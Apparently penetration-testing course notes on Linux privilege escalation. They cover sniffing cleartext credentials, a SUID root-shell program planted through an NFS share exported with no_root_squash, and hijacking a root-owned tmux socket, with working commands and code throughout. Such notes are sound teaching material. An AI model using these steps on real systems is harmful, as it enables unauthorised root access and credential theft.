## Passive Traffic Capture

If `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

## Weak NFS Privileges

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command `showmount -e`, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

```shell
showmount -e 10.129.2.12
```

| **Option**       | **Description**                                                                                                                                                                                                                                                                               |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set. |
| `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                           |

```shell
cat /etc/exports
```

```shell
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

```shell
cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```shell
gcc shell.c -o shell
```

```shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

## Hijacking Tmux Sessions

Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

```shell
tmux -S /shareds new -s debugsess
```

```shell
chown root:devs /shareds
root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess

```

```shell
ps aux | grep tmux
```

```shell
ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

```shell
tmux -S /shareds
```
